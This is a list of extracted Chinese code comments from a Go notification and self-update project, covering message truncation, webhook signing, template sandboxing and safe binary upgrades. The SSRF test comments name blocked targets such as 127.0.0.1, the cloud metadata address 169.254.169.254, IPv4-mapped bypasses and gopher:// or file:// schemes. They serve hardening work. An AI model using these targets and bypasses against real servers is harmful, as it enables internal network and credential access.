+596 source/notify/render.go:139 // itoa 是 strconv.Itoa 的短别名，仅用于拼接展示文本，避免到处 import strconv。
+597 source/notify/render_test.go:10 // 这是本包最要紧的一条不变量。企微按**字节**限长，中文 3 字节/字，
+598 source/notify/render_test.go:11 // 任何按字节硬切的实现都会把汉字切成半个，产出非法 UTF-8 而被平台拒收。
+599 source/notify/render_test.go:12 // 用长度互质的多种中英混排输入去撞每一个可能的切点。
+600 source/notify/render_test.go:17 // 4 字节 emoji，切错更明显
+601 source/notify/render_test.go:29 // 未被截断时不得改动内容。
+602 source/notify/render_test.go:48 // max 小于省略号本身时，不能因为追加省略号而反过来超限。
+603 source/notify/render_test.go:53 // 正常情况应带省略号。
+604 source/notify/render_test.go:60 // 与 TruncateBytes 的口径差异必须保留：Telegram 按字符限长，
+605 source/notify/render_test.go:61 // 用字节口径会把中文消息切到只剩三分之一。
+606 source/notify/render_test.go:67 // 同样的字符串按字节口径应明显更短。
+607 source/notify/render_test.go:81 // 截断后仍须可读且合法。
+608 source/notify/render_test.go:89 // 直接截断 HTML 会切出 `<a href="htt` 这种残片，平台会拒收整条消息。
+609 source/notify/render_test.go:96 // 尾部不能有未闭合的 `<`（即最后一段里出现 `<` 却无 `>`）。
+610 source/notify/render_test.go:110 // 超出上限时必须标注总数，否则读者不知道还有多少资产没列出来。
+611 source/notify/render_test.go:127 // 未知状态原样回显，不臆造标签。
+612 source/notify/render_test.go:133 // TestTruncateHTMLNeverCutsEntity 覆盖审计指出的一处遗漏：截断不只要避开
+613 source/notify/render_test.go:134 // 半截标签，还要避开被切断的 HTML 实体。
+614 source/notify/render_test.go:136 // `&amp;` 被切成 `&amp` 之后，一个只认实体的解析器可能拒收**整条**消息——
+615 source/notify/render_test.go:137 // 而超长汇总消息本来就常见，代价太大。
+616 source/notify/render_test.go:142 // 尾部不得出现「有 & 但没有对应 ;」的实体残片。
+617 source/notify/sign_test.go:9 // 签名基准值由 OpenSSL 独立算出，不是用本包自己的实现生成的——
+618 source/notify/sign_test.go:10 // 否则只能证明「代码没变」，证明不了「算法对」。
+619 source/notify/sign_test.go:13 //	钉钉: printf '%s\n%s' "$TS" "$SECRET" | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A
+620 source/notify/sign_test.go:15 //	飞书: printf '' | openssl dgst -sha256 -hmac "$(printf '%s\n%s' "$TS" "$SECRET")" -binary | openssl base64 -A
+621 source/notify/sign_test.go:40 // 原有 query 参数（access_token）不能被签名覆盖掉。
+622 source/notify/sign_test.go:53 // TestSignAlgorithmsDiffer 锁住两家的算法差异。它们刚好互为对方的参数顺序
+623 source/notify/sign_test.go:54 // （钉钉 key=secret，飞书 key=待签串），照另一家抄必然校验失败，
+624 source/notify/sign_test.go:55 // 这条用例确保将来重构不会把两者合并成同一个函数。
+625 source/notify/sign_test.go:69 // 未开启加签的机器人：不得凭空添加 timestamp/sign 参数。
+626 source/notify/sign_test.go:87 // file:// 之类不应放行——http.Client 对它们的处理超出预期范围。
+627 source/notify/ssrf_test.go:15 // 本文件覆盖两条相关的加固：
+628 source/notify/ssrf_test.go:16 //   ① 投递地址不得把服务端当跳板打内网 / 云元数据（SSRF）
+629 source/notify/ssrf_test.go:17 //   ② 地址校验的错误信息不得带出地址里的凭据
+630 source/notify/ssrf_test.go:19 // 关于测试环境：本包大量用例用 127.0.0.1 上的 httptest 假接收端，守卫默认会拦下
+631 source/notify/ssrf_test.go:20 // 它们。所以 TestMain 里统一打开 AllowLocalTargetsEnv，而下面每个 SSRF 用例都
+632 source/notify/ssrf_test.go:21 // 显式把它清掉，以断言**默认拒绝**的行为。
+633 source/notify/ssrf_test.go:24 // 让常规用例能连本地的假接收端；SSRF 用例会自己临时清空。
+634 source/notify/ssrf_test.go:29 // TestDialGuardRejectsLoopbackByDefault 是 SSRF 防护的核心断言：
+635 source/notify/ssrf_test.go:30 // 默认配置下，投递到环回地址必须被**连接层**拒绝。
+636 source/notify/ssrf_test.go:39 // 关掉逃生口 = 默认行为
+637 source/notify/ssrf_test.go:48 // 错误信息要能指导用户怎么放开（本机 SMTP 中继是合法配置）。
+638 source/notify/ssrf_test.go:54 // TestDialGuardAllowsLoopbackWhenOptedIn 反向用例：显式打开后必须能用，
+639 source/notify/ssrf_test.go:55 // 否则本机 postfix / 内网中继这类合法部署会被一刀切废掉。
+640 source/notify/ssrf_test.go:72 // 云元数据端点——本函数存在的主要理由
+641 source/notify/ssrf_test.go:76 // IPv4-mapped 形式必须还原后再判，否则是绕过口
+642 source/notify/ssrf_test.go:84 // RFC1918 私网**刻意放行**：内网自建 Mattermost / SMTP 中继是常见合法用法。
+643 source/notify/ssrf_test.go:85 // 这条断言把这个取舍固定下来——若将来有人顺手加上私网判断，这里会失败，
+644 source/notify/ssrf_test.go:86 // 从而逼出一次有意识的决定（而不是静默废掉一批部署）。
+645 source/notify/ssrf_test.go:95 // TestValidateHTTPURLRejectsLiteralPrivateTargets 覆盖配置阶段的前置提示：
+646 source/notify/ssrf_test.go:96 // 字面 IP 在保存时就该被拒，而不是等第一次投递失败。
+647 source/notify/ssrf_test.go:108 // 公网地址与私网地址照常通过（私网留给拨号阶段，那里不拦）。
+648 source/notify/ssrf_test.go:116 // TestValidateHTTPURLErrorNeverLeaksCredentials 是审计指出我上一轮遗漏的分支。
+649 source/notify/ssrf_test.go:118 // url.Parse **失败**时会返回 *url.Error，其 Error() 含完整原始地址。上一轮我只
+650 source/notify/ssrf_test.go:119 // 脱敏了 http.Client.Do 的返回错误，漏了这里；而当时补的「永久失败路径」用例
+651 source/notify/ssrf_test.go:120 // （file://、gopher://、ftp://）其实都能被 url.Parse 解析成功、走的是 scheme 分支，
+652 source/notify/ssrf_test.go:121 // 所以全绿也证明不了这条路径安全——是假保证。
+653 source/notify/ssrf_test.go:124 // 非法百分号转义
+654 source/notify/ssrf_test.go:125 // 端口非数字
+655 source/notify/ssrf_test.go:126 // 括号不配对
+656 source/notify/ssrf_test.go:129 // 先确认这个输入**确实**让 url.Parse 失败。不做这一步的话，用例可能在
+657 source/notify/ssrf_test.go:130 // 毫无察觉的情况下走到别的分支（上一轮的假保证就是这么来的）。
+658 source/notify/ssrf_test.go:142 // 确认渠道层的包装也没有把地址带出去。
+659 source/notify/ssrf_test.go:151 // TestEmailDialGuardRejectsLoopbackByDefault 覆盖 SMTP 渠道的拨号守卫。
+660 source/notify/ssrf_test.go:153 // 邮件渠道曾经用的是裸 net.Dialer，是整套 SSRF 防护里唯一的缺口：host 填成
+661 source/notify/ssrf_test.go:154 // 169.254.169.254 或 127.0.0.1 能直接连上，而 smtp.NewClient 握手失败时会把
+662 source/notify/ssrf_test.go:155 // 对端返回的那一行包进错误、经 last_error 由投递历史接口回显——正是其它渠道
+663 source/notify/ssrf_test.go:156 // 已经关掉的半盲读原语；「连接被拒 vs 超时」的耗时差异还能用来探测端口。
+664 source/notify/ssrf_test.go:158 // 本包的 TestMain 全局打开了 AllowLocalTargetsEnv（大量用例用 127.0.0.1 上的
+665 source/notify/ssrf_test.go:159 // 假接收端），所以这个用例必须自己把它清掉——否则守卫在不在都会通过，
+666 source/notify/ssrf_test.go:160 // 这也正是缺口当初没被任何测试发现的原因。
+667 source/notify/ssrf_test.go:165 // 关掉逃生口 = 默认行为
+668 source/notify/ssrf_test.go:170 // 连接根本不该建立：守卫在 Control 钩子里拦下，EHLO 永远发不出去。
+669 source/notify/ssrf_test.go:174 // 错误信息要能指导用户怎么放开（本机 postfix 中继是合法配置）。
+670 source/notify/ssrf_test.go:180 // TestEmailDialGuardAllowsLoopbackWhenOptedIn 是配对的反向用例：显式打开后
+671 source/notify/ssrf_test.go:181 // 必须能正常投递。内网自建 SMTP / 本机中继是非常常见的部署，守卫不能一刀切。
+672 source/notify/telegram.go:12 // telegramTextLimit 是 Telegram sendMessage 的 text 字段上限（字符数）。
+673 source/notify/telegram.go:15 // telegramChannel 实现 Telegram Bot API。
+674 source/notify/telegram.go:17 // 平台特性：
+675 source/notify/telegram.go:18 //   - 鉴权全部在 URL path 里（/bot<token>/sendMessage），无需加签。
+676 source/notify/telegram.go:19 //   - 用 HTML 解析模式而不是 MarkdownV2：MarkdownV2 要求转义 `_*[]()~`>#+-=|{}.!`
+677 source/notify/telegram.go:20 //     共 18 个字符，漏一个就整条消息被拒；HTML 只需转义 & < > 三个。
+678 source/notify/telegram.go:21 //   - 业务错误同样藏在 HTTP 200 里，靠 ok 字段判断。
+679 source/notify/telegram.go:26 // Telegram 单聊约 1 条/秒、群组 20 条/分钟。取保守值。
+680 source/notify/telegram.go:29 // Bot Token 是完整凭据；chat_id 只是收件人，不算秘密（拿到它没有 Token 也发不了消息）。
+681 source/notify/telegram.go:32 // base_url 决定 Token 被发往哪个 API 端点（如自建反代），改它必须重新表态 Token。
+682 source/notify/telegram.go:80 // 429 是限流，退避后重试有效；其余（400 参数错、401 token 错、403 被拉黑、
+683 source/notify/telegram.go:81 // 404 chat 不存在）都是配置问题，重试不会自愈。
+684 source/notify/telegram.go:88 // telegramEndpoint 拼出 sendMessage 地址。base_url 留空时用官方 API，
+685 source/notify/telegram.go:89 // 非空时用于自建 Bot API 反代（国内网络下的常见需求）。
+686 source/notify/telegram.go:100 // 不透传 err：地址里含 Bot Token，且此时连 addr 都不该回显。
+687 source/notify/telegram.go:106 // telegramHTML 渲染 HTML 正文，返回正文与实际写入的条目数（见 Channel.Send）。
+688 source/notify/telegram.go:111 // Telegram 的上限是**字符数**，所以打包也按字符计量（runeSize）。
+689 source/notify/telegram.go:151 // telegramReservedRunes 预留给消息标题与可能出现的截断提示（按字符计）。
+690 source/notify/telegram.go:154 // telegramBatchLine 渲染汇总里的一条（未转义，由调用方统一转义）。
+691 source/notify/telegram.go:162 // telegramBatchTitle 渲染汇总消息的标题行。条数用的是**本条实际包含**的条数，
+692 source/notify/telegram.go:163 // 而不是本批总数——否则读者会以为消息头写的数字就是全部。
+693 source/notify/telegram.go:175 // telegramEscape 转义 HTML 文本内容。
+694 source/notify/telegram.go:176 // Telegram 只认这三种实体，转义后 &amp; 之类的已有实体会被二次转义——这正是
+695 source/notify/telegram.go:177 // 期望行为：我们要显示的是原始字符，不是让用户注入 HTML。
+696 source/notify/telegram.go:185 // telegramEscapeAttr 转义 HTML 属性值。在文本转义之外还要处理引号——
+697 source/notify/telegram.go:186 // URL 里带引号会提前闭合 href 属性，把后面的内容变成注入点。
+698 source/notify/webhook.go:15 // webhookChannel 是通用 Webhook 适配器：用户自定 URL、方法、请求头与 JSON 模板。
+699 source/notify/webhook.go:16 // 它的存在让本功能不必为 Slack / Mattermost / Discord / 自建系统各写一个实现——
+700 source/notify/webhook.go:17 // 那些平台都能被一个可配模板覆盖。
+701 source/notify/webhook.go:22 // 通用 Webhook 没有官方限制，返回 0 表示默认不限流，由使用者按对端能力自定。
+702 source/notify/webhook.go:25 // 掩码 url 与 headers：目标地址本身常带 token，自定义头里通常放着鉴权凭据，
+703 source/notify/webhook.go:26 // 两者都会出现在接口回显里，所以都要挡。
+704 source/notify/webhook.go:27 // 代价是编辑时若想改动其中一个头，需要重新填整组头（掩码值会被解释为「保持原值」）——
+705 source/notify/webhook.go:28 // 这个取舍是刻意的：宁可多填一次，也不把凭据回显到浏览器。
+706 source/notify/webhook.go:31 // 目的地是 url。改 url 时必须重新表态 headers —— 否则原始 Authorization 头
+707 source/notify/webhook.go:32 // 会被原样发到新地址，这正是掩码绕过的主路径。
+708 source/notify/webhook.go:35 // webhookDefaultTemplate 是未填模板时的兜底请求体：一个直白的 JSON 结构，
+709 source/notify/webhook.go:36 // 覆盖绝大多数「收一条 JSON 入库」的自建接收端。
+710 source/notify/webhook.go:57 // webhookTemplateData 是暴露给用户模板的上下文。
+711 source/notify/webhook.go:64 // SentAt 是本次投递时间（RFC3339），供接收端记录。
+712 source/notify/webhook.go:79 // StatusLabel 是状态变更的可读描述，如「待处理 → 已修复」；非状态变更时为空。
+713 source/notify/webhook.go:111 // GET 不带请求体：把内容塞进 query 超出模板能力范围，也不符合 GET 语义，
+714 source/notify/webhook.go:112 // 所以 GET 只适合「命中即触发钩子」这类接收端。
+715 source/notify/webhook.go:119 // 模板渲染出的是字符串形式的 JSON，这里转成 json.RawMessage 原样发出，
+716 source/notify/webhook.go:120 // 避免二次转义把用户精心构造的结构套进一个 JSON 字符串里。
+717 source/notify/webhook.go:129 // 允许覆盖，但放在 headers 之后应用，保证显式配置优先。
+718 source/notify/webhook.go:138 // 通用 Webhook 不截断正文（接收端是用户自己的服务，体积由 body_template 决定），
+719 source/notify/webhook.go:139 // 因此整批都算送达。
+720 source/notify/webhook.go:143 // renderWebhookBody 用用户模板（或默认模板）渲染请求体。
+721 source/notify/webhook.go:159 // parseWebhookTemplate 解析模板。
+722 source/notify/webhook.go:161 // missingkey=zero 让缺失的 map 键渲染成零值而不是报错——但本文件的上下文是结构体，
+723 source/notify/webhook.go:162 // 主要作用是让 .Items 为空时 range 不出错。真正需要防的是 .Items 为 nil。
+724 source/notify/webhook.go:167 // webhookTemplateFuncs 是暴露给模板的辅助函数。
+725 source/notify/webhook.go:169 // json 把任意值序列化成 JSON。
+726 source/notify/webhook.go:171 // 这个函数不是锦上添花而是必需的：省去它，用户只能写 {{.Title}} 直接插值，
+727 source/notify/webhook.go:172 // 而漏洞标题里只要有引号或换行，整段请求体就不再是合法 JSON——接收端会
+728 source/notify/webhook.go:173 // 拒收，且报错信息指向「JSON 解析失败」，完全联想不到是标题里有个引号。
+729 source/notify/webhook.go:181 // jsons 用于把 JSON 片段嵌进另一段 JSON 字符串值内部（做一层字符串转义）。
+730 source/notify/webhook.go:191 // 去掉外层引号：调用方自己决定要不要加引号。
+731 source/notify/webhook_template_test.go:11 // 本文件锁住通用 Webhook 模板的**能力边界**。
+732 source/notify/webhook_template_test.go:13 // 这是全包唯一「用户提供的字符串会被当代码求值」的地方，所以要明确它能做什么、
+733 source/notify/webhook_template_test.go:14 // 不能做什么，并用测试把这些性质固定下来——否则将来有人顺手给模板上下文加个
+734 source/notify/webhook_template_test.go:15 // 方法、或在 FuncMap 里加个 readFile，能力面就静默扩大了，而 diff 看起来
+735 source/notify/webhook_template_test.go:16 // 只是一个无害的小函数。
+736 source/notify/webhook_template_test.go:18 // TestTemplateContextHasNoMethods 是最重要的一条。
+737 source/notify/webhook_template_test.go:20 // text/template 会调用导出方法（{{.Foo}} 既能取字段也能调方法）。所以模板上下文
+738 source/notify/webhook_template_test.go:21 // 只要能接触到**任何**带导出方法的类型，就等于把那些方法暴露给了模板作者。
+739 source/notify/webhook_template_test.go:22 // 本功能的上下文刻意全是纯数据（只有导出字段、零方法）。
+740 source/notify/webhook_template_test.go:24 // 若这条失败：说明有人给 webhookTemplateData / webhookItem 加了方法。
+741 source/notify/webhook_template_test.go:25 // 在决定放行之前，先想清楚那个方法能不能被模板用来读取不希望暴露的东西。
+742 source/notify/webhook_template_test.go:40 // TestTemplateFuncsAreMinimal 锁住暴露给模板的函数集合。
+743 source/notify/webhook_template_test.go:42 // FuncMap 里每多一个函数就多一项能力。当前只有 json / jsons，作用是把值序列化
+744 source/notify/webhook_template_test.go:43 // 成 JSON 片段——不能读文件、不能发请求、不能执行命令。
+745 source/notify/webhook_template_test.go:57 // TestTemplateCannotReachUnknownData 覆盖模板里的越界访问：
+746 source/notify/webhook_template_test.go:58 // 访问不存在的东西必须失败，而不是回显点什么；且失败信息不得带出内部数据。
+747 source/notify/webhook_template_test.go:64 // 错误里不能出现模板上下文里的真实内容（漏洞标题/摘要）。
+748 source/notify/webhook_template_test.go:72 // TestTemplateRenderFailsPermanently 模板写错属于配置错误，重试不会自愈。
+749 source/notify/webhook_template_test.go:73 // 若被判成可重试，一条坏模板会让每次投递都白跑三轮退避。
+750 source/notify/webhook_template_test.go:82 // 即便绕过校验直接投递，也必须判永久失败而不是反复重试。
+751 source/notify/webhook_template_test.go:89 // TestTemplateCanOnlyProduceJSON 覆盖「模板渲染结果必须是合法 JSON」这条约束。
+752 source/notify/webhook_template_test.go:90 // 它顺带挡住了「用模板生成纯文本去触发别的协议」这类用法。
+753 source/notify/webhook_template_test.go:92 // 合法模板能过。
+754 source/notify/webhook_template_test.go:97 // 渲染出非 JSON 时必须拒绝（而不是原样发出去）。
+755 source/notify/wecom.go:10 // weComMarkdownLimit 是企微群机器人 markdown content 的硬上限（字节，非字符）。
+756 source/notify/wecom.go:11 // 这是全部六个渠道里最紧的限制，也是 TruncateBytes 存在的主要原因。
+757 source/notify/wecom.go:14 // weComChannel 实现企业微信群机器人。
+758 source/notify/wecom.go:16 // 平台特性：
+759 source/notify/wecom.go:17 //   - 唯一通过 URL 上的 key 鉴权，不支持加签——所以 webhook 地址本身就是全部凭据。
+760 source/notify/wecom.go:18 //   - markdown content 上限 4096 **字节**，超长整条被拒（不是截断）。中文 3 字节/字，
+761 source/notify/wecom.go:19 //     意味着正文只有一千多字可写，必须客户端截断。
+762 source/notify/wecom.go:20 //   - 限流 20 条/分钟，同样靠客户端限流兜住。
+763 source/notify/wecom.go:27 // 企业微信只有 Webhook 一处凭据（URL 上的 key），且它不支持加签——
+764 source/notify/wecom.go:28 // 整个地址就是全部凭据，没有别的字段需要掩码。
+765 source/notify/wecom.go:31 // 企微只有 Webhook 一处字段，它既是目的地也是凭据，因此没有「改地址后残留的凭据」可言。
+766 source/notify/wecom.go:49 // 汇总批可能很长（50 条 × 每条一行 + 前缀），4096 字节很容易超。
+767 source/notify/wecom.go:50 // 截断在这里做而不是靠平台报错：被拒意味着这一批全丢，而截断至少送达前若干条。
+768 source/notify/wecom.go:68 // 45009 是接口调用超过限制——平台的限流窗口会滚动，退避后重试是有效的，
+769 source/notify/wecom.go:69 // 所以显式归为可重试。走到这里说明客户端 rate_per_min 配得过于激进，
+770 source/notify/wecom.go:70 // 重试只是兜底，真正的修法是调低该渠道的限流值。
+771 source/notify/wecom.go:74 // 93000 是 webhook key 无效——永久失败，重试不会自愈。
+772 source/selfupdate/bootstrap.go:17 // smokeEnv 让被冒烟测试拉起的子进程直接跳过 Bootstrap。
+773 source/selfupdate/bootstrap.go:19 // 严格来说不加也不会出事：子进程的 os.Executable() 是 artex.new，推导出来的
+774 source/selfupdate/bootstrap.go:20 // 全部路径都带 .new 前缀，碰不到真正的升级文件。但依赖这种巧合太脆弱，
+775 source/selfupdate/bootstrap.go:21 // 显式短路一目了然，也省掉子进程一次无谓的磁盘探测。
+776 source/selfupdate/bootstrap.go:24 // Action 是 Bootstrap 给 main 的指令。
+777 source/selfupdate/bootstrap.go:28 // Continue：照常启动 server。
+778 source/selfupdate/bootstrap.go:30 // Restart：立刻以 ExitRestart 退出，让守护脚本重新拉起。
+779 source/selfupdate/bootstrap.go:34 // State 描述本次启动时的升级状态，供 /api/update/check 如实告诉前端
+780 source/selfupdate/bootstrap.go:35 // "上一次升级是成功了还是被回滚了"。
+781 source/selfupdate/bootstrap.go:43 // Bootstrap 在 main 的最开头运行，必须在任何监听端口、打开数据库之前调用。
+782 source/selfupdate/bootstrap.go:45 // 三种局面：
+783 source/selfupdate/bootstrap.go:47 //	① 存在暂存件 artex.new  → 校验 + 冒烟，通过则换装并要求重启；不通过则丢弃继续跑旧版
+784 source/selfupdate/bootstrap.go:48 //	② 只剩标记文件          → 说明刚换装完，累计一次尝试；连续失败够多次则回滚
+785 source/selfupdate/bootstrap.go:49 //	③ 什么都没有            → 正常启动
+786 source/selfupdate/bootstrap.go:71 // applyStaged 处理"存在暂存件"的局面：校验通过就换装，失败就丢弃。
+787 source/selfupdate/bootstrap.go:73 // 这里是整个升级链路唯一会覆盖可执行文件的地方，也是最后一道闸门——冒烟测试挡掉
+788 source/selfupdate/bootstrap.go:74 // 下载损坏、架构选错、动态链接缺失这类问题。一旦放行一个跑不起来的二进制，
+789 source/selfupdate/bootstrap.go:75 // 守护脚本会不知疲倦地反复拉起它，而 Go 代码根本没机会运行，自动回滚也就无从谈起。
+790 source/selfupdate/bootstrap.go:93 // 换装成功。保留标记，交给下一次启动（跑的就是新版）确认是否稳定。
+791 source/selfupdate/bootstrap.go:105 // confirmOrRollback 处理"换装后的启动"：累计尝试次数，超限则把旧版换回来。
+792 source/selfupdate/bootstrap.go:107 // 计数只在 Go 代码跑起来后才递增，所以它覆盖的是"能执行但初始化时崩溃"
+793 source/selfupdate/bootstrap.go:108 // （配置不兼容、端口被占、DB 迁移炸了）这类故障；"根本无法 exec" 由换装前的
+794 source/selfupdate/bootstrap.go:109 // 冒烟测试挡住，两者合起来才是完整的。
+795 source/selfupdate/bootstrap.go:114 // 回滚都失败了就别再重启了，否则会陷入无限重启。清掉标记，
+796 source/selfupdate/bootstrap.go:115 // 让进程按当前状态起——起不来的话用户至少能在日志里看到原因。
+797 source/selfupdate/bootstrap.go:133 // Settle 确认新版本已稳定运行，清除升级标记。
+798 source/selfupdate/bootstrap.go:135 // 由 main 在 HTTP 监听起来之后延迟调用：活过这段时间才算数，否则标记留在原地，
+799 source/selfupdate/bootstrap.go:136 // 下次启动继续累计尝试次数，直到触发回滚。
+800 source/selfupdate/bootstrap.go:156 // SettleDelay 是判定"新版本活下来了"所需的运行时长。
+801 source/selfupdate/bootstrap.go:159 // verifyStaged 校验暂存件：先比对 SHA256，再真正把它拉起来跑一次。
+802 source/selfupdate/bootstrap.go:175 // smokeTest 用 -h 拉起新二进制，确认它在当前系统上真的能执行。
+803 source/selfupdate/bootstrap.go:176 // 这能挡掉下载截断、架构选错（exec format error）、缺依赖等一大类问题。
+804 source/selfupdate/bootstrap.go:200 // swap 把当前二进制换成暂存的新版本。
+805 source/selfupdate/bootstrap.go:202 // Unix 和 Windows 都允许 rename 一个正在运行的可执行文件（Windows 禁止的是删除和
+806 source/selfupdate/bootstrap.go:203 // 覆盖，rename 不在其列），所以这里不需要分平台，也不需要先停掉自己。
+807 source/selfupdate/bootstrap.go:205 // Windows 的 rename 不会覆盖已存在的目标，上一轮升级留下的 .old 必须先清掉。
+808 source/selfupdate/bootstrap.go:213 // 换装失败但当前版本已经被挪走了，必须原样放回去，否则下次启动没有可执行文件。
+809 source/selfupdate/bootstrap.go:223 // rollback 把 swap 备份的旧版本换回来。
+810 source/selfupdate/bootstrap.go:228 // 把起不来的新版挪到 .failed 留作排查，而不是直接删掉。
+811 source/selfupdate/bootstrap.go:240 // Rollback 是 /api/update/rollback 的实现：主动退回上一版本。
+812 source/selfupdate/bootstrap.go:241 // 只做换装，重启同样交给守护脚本（调用方随后以 ExitRestart 退出）。
+813 source/selfupdate/bootstrap.go:254 // 交换当前与备份：回滚之后还能再滚回来。
+814 source/selfupdate/bootstrap.go:271 // HasBackup 报告是否存在可回滚的上一版本，供前端决定要不要显示回滚按钮。
+815 source/selfupdate/github.go:35 // allowedHosts 限定升级链路能访问的域名。配合下面的 checkRedirect，
+816 source/selfupdate/github.go:36 // 任何一跳被重定向到名单外的主机都会直接失败——这是防止 DNS 污染 / 中间人
+817 source/selfupdate/github.go:37 // 把二进制换掉的第一道闸门，第二道是 SHA256SUMS 比对。
+818 source/selfupdate/github.go:46 // Release 是 GitHub Release 里我们关心的字段。
+819 source/selfupdate/github.go:58 // Asset 是 Release 上挂的一个文件。
+820 source/selfupdate/github.go:65 // NewClient 构造一个只认 GitHub 域名的 HTTP 客户端。proxy 为空则直连。
+821 source/selfupdate/github.go:67 // 刻意不复用默认 Transport：升级链路必须强制走 TLS 且校验证书，不能被别处
+822 source/selfupdate/github.go:68 // 设置的 InsecureSkipVerify 之类影响到。
+823 source/selfupdate/github.go:91 // checkURL 强制 https + 域名白名单。
+824 source/selfupdate/github.go:102 // FetchLatest 查询最新正式版。
+825 source/selfupdate/github.go:128 // 未认证的 GitHub API 是每 IP 每小时 60 次，共用出口 IP 时很容易撞上。
+826 source/selfupdate/github.go:146 // AssetName 返回当前平台对应的发布包名，与 build.sh 的 package_binary 保持一致：
+827 source/selfupdate/github.go:147 // artex-<版本>-<os>-<arch>.zip（版本号不带 v 前缀）。
+828 source/selfupdate/github.go:152 // FindAsset 在 Release 里按名字找资产。
+829 source/selfupdate/selfupdate.go:1 // Package selfupdate implements ARTEX 的页面一键更新：从 GitHub Release 拉取新版
+830 source/selfupdate/selfupdate.go:2 // 二进制、校验、暂存，并在下次启动时原子换装。
+831 source/selfupdate/selfupdate.go:4 // 整体分工（见 start.sh / start.bat）：
+832 source/selfupdate/selfupdate.go:6 //	启动脚本  = 傻瓜守护循环，只负责"进程退出后按退出码决定是否再拉起"
+833 source/selfupdate/selfupdate.go:7 //	本包      = 全部易错逻辑（下载 / SHA256 校验 / 冒烟 / 换装 / 失败回滚）
+834 source/selfupdate/selfupdate.go:9 // 之所以把换装放在 Go 而不是脚本里，是因为 sha256 校验和冒烟测试在 sh 和 bat 上
+835 source/selfupdate/selfupdate.go:10 // 要写两套（sha256sum / shasum / certutil），而这恰恰是最不能出错的一环——换上一个
+836 source/selfupdate/selfupdate.go:11 // 跑不起来的二进制，守护进程会忠实地反复拉起它，用户只能上机器手工救。
+837 source/selfupdate/selfupdate.go:13 // 一次完整升级经过三次进程启动：
+838 source/selfupdate/selfupdate.go:15 //	① 旧版 server 收到 /api/update/apply → 下载校验 → 暂存 artex.new → exit 75
+839 source/selfupdate/selfupdate.go:16 //	② 脚本重新拉起旧版 → Bootstrap 发现 artex.new → 校验+冒烟 → 换装 → exit 75
+840 source/selfupdate/selfupdate.go:17 //	③ 脚本重新拉起，此时已是新版 → Bootstrap 记一次尝试 → 启动成功后清除标记
+841 source/selfupdate/selfupdate.go:19 // 任何一步失败都退回旧版：② 校验不过就删掉暂存件继续跑旧版；③ 连续 3 次没活到
+842 source/selfupdate/selfupdate.go:20 // 清除标记（起不来就崩）则自动把 artex.old 换回去。
+843 source/selfupdate/selfupdate.go:32 // ExitRestart 是"请守护进程重新拉起我"的退出码（EX_TEMPFAIL）。启动脚本看到它
+844 source/selfupdate/selfupdate.go:33 // 就立刻重跑，不计入崩溃退避。0 表示用户正常停止（脚本退出循环），其余均视为崩溃。
+845 source/selfupdate/selfupdate.go:36 // maxAttempts 是换装后允许的启动尝试次数。新版每次启动都会把计数 +1，活过
+846 source/selfupdate/selfupdate.go:37 // settleDelay 则清除标记；连崩 maxAttempts 次说明新版根本起不来，自动回滚。
+847 source/selfupdate/selfupdate.go:40 // Paths 是一次升级涉及的全部文件，统一挂在**Executable directory**下。
+848 source/selfupdate/selfupdate.go:41 // 刻意不用 CWD：服务化运行时工作目录可能是 / 或任意路径，用 CWD 会让暂存件落到
+849 source/selfupdate/selfupdate.go:42 // 别处，换装逻辑直接失效。
+850 source/selfupdate/selfupdate.go:52 // ResolvePaths 按当前可执行文件推导全部升级路径。
+851 source/selfupdate/selfupdate.go:54 // Windows 上 .new/.old 也必须带 .exe 后缀，否则冒烟测试和换装后的执行都会失败，
+852 source/selfupdate/selfupdate.go:55 // 所以先把后缀摘掉再拼，两个平台的命名才对称。
+853 source/selfupdate/selfupdate.go:80 // marker 记录一次换装的进度，用来在新版起不来时触发自动回滚。
+854 source/selfupdate/selfupdate.go:108 // cleanStaged 清掉暂存件。换装成功、校验失败、用户取消都走它，避免残留的
+855 source/selfupdate/selfupdate.go:109 // artex.new 在下次启动时被重新尝试。
+856 source/selfupdate/selfupdate.go:115 // CompareVersions 比较两个版本号，返回 -1/0/1（a<b / a==b / a>b）。
+857 source/selfupdate/selfupdate.go:116 // ok=false 表示至少一边不是可比较的版本号（例如本地开发构建的 "dev" 或
+858 source/selfupdate/selfupdate.go:117 // git describe 产出的 "0.3.7-2-gabc1234-dirty"），此时调用方应禁用一键更新，
+859 source/selfupdate/selfupdate.go:118 // 否则会把开发中的构建"升级"成正式版、覆盖掉未提交的改动。
+860 source/selfupdate/selfupdate.go:136 // parseVersion 解析 "v0.3.7" / "0.3.7" 形式的版本号为 [3]int。
+861 source/selfupdate/selfupdate.go:138 // 只接受纯净的三段式：build.sh 在非 tag 构建时用 git describe 产出
+862 source/selfupdate/selfupdate.go:139 // "0.3.7-2-gabc1234" 这类带后缀的版本，它们必须被判为不可比较，而不是被当成
+863 source/selfupdate/selfupdate.go:140 // 0.3.7 —— 否则开发构建会被误判为"已是最新"或被正式版覆盖。
+864 source/selfupdate/selfupdate.go:162 // InDocker 报告进程是否跑在容器里。Docker 下换装写的是容器可写层，
+865 source/selfupdate/selfupdate.go:163 // `docker compose up -d` 重建容器会退回镜像自带的版本——这是预期行为
+866 source/selfupdate/selfupdate.go:164 // （那时用户本来就在拉新镜像），但前端要能据此把话说清楚。
+867 source/selfupdate/selfupdate_test.go:13 // testPaths 造一个隔离的升级目录。不能直接用 ResolvePaths()——那会指向测试
+868 source/selfupdate/selfupdate_test.go:14 // 二进制本身，一跑就把 go test 的可执行文件改名了。
+869 source/selfupdate/selfupdate_test.go:28 // fakeBin 写一个可执行的壳脚本冒充 artex。smokeTest 只是用 -h 拉起它看退出码，
+870 source/selfupdate/selfupdate_test.go:29 // 脚本完全够用，而且比编译一个真二进制快得多。
+871 source/selfupdate/selfupdate_test.go:45 // stage 把 bin 布置成"已暂存待换装"的样子：写好 artex.new 和它的校验和。
+872 source/selfupdate/selfupdate_test.go:83 // build.sh 去掉 v，tag 带 v，两边都要认
+873 source/selfupdate/selfupdate_test.go:85 // 按数字比而不是字典序
+874 source/selfupdate/selfupdate_test.go:87 // 开发构建必须判为不可比较，否则会被正式版覆盖掉未提交的改动。
+875 source/selfupdate/selfupdate_test.go:111 // 关键不变量：所有升级文件都和可执行文件同目录。落到 CWD 会让服务化运行
+876 source/selfupdate/selfupdate_test.go:112 // （工作目录可能是 /）时的换装彻底失效。
+877 source/selfupdate/selfupdate_test.go:118 // Windows 上 .new/.old 必须保留 .exe，否则冒烟测试和换装后的执行都会失败。
